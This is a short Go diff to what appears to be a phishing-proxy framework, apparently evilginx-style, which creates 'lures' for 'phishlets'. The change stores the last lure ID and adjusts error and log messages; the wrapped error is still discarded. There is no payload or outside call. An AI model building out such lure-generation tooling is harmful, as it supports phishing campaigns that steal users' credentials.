@@ -64,6 +64,7 @@ type linkGrabber struct {
 	cfg	  *Config
 	crt_db	  *CertDb
 	db	  *database.Database
+	lastLureID int
 }
 
 func NewLinkGrabber(cfg *Config, crt_db *CertDb, db *database.Database) (*linkGrabber, error){
@@ -80,7 +81,7 @@ func NewLinkGrabber(cfg *Config, crt_db *CertDb, db *database.Database) (*linkGr
 func (lg *linkGrabber) GrabLures(args []string) error {
 	_, err := lg.cfg.GetPhishlet(args[1])
 	if err != nil {
-		fmt.Errorf("Error creating file")
+		fmt.Errorf("Error creating file: %w", err)
 	}
 
 	l := &Lure{
@@ -89,7 +90,10 @@ func (lg *linkGrabber) GrabLures(args []string) error {
 	}
 
 	lg.cfg.AddLure(args[1], l)
-	log.Info("created lure with ID: %d", len(lg.cfg.lures)-1)
+	lure_id := len(lg.cfg.lures) - 1
+	log.Info("created lure with ID: %d", lure_id)
+	//log.Info("lure id: %d", )
+	lg.lastLureID = lure_id
 	return nil
 }
 
